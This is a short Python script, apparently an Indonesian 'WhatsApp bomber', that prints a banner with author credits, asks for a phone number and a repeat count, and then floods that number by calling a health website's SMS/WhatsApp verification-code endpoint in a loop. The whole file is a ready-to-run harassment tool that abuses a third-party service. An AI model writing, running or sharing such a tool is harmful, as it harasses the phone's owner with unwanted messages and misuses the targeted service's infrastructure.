import requests as r
import os, sys

os.system('clear')
banner = """
                        _________
                        [       ] 
                        | 0   0 | 
                      //|   °   |\\
                     $  [__###__]  $
                        | |   | |
                        ---   ---
                      ({Wa Bomber})
"""
print (banner)
print               ('AuThor = Dimas')
print               ('YouTube = Dimas Sanz')
print               ('GitHub = https://github.com/D1M4SPR0-ID')
print
print
print

num = input('Masukan Nomor Tanpa 62/0 : ')
jum = int(input('Jumlah :'))
for i in range(jum):
    req = r.get('https://passport.pedulisehat.id/v2/sms/captcha?mobile='+num+'&mobile_country_code=62&channel=WhatsApp&_=1591007074597')
    if req.status_code == 200:
       print('Succes Sent To :' +num)
    else:
       print('Gagal Mengirim')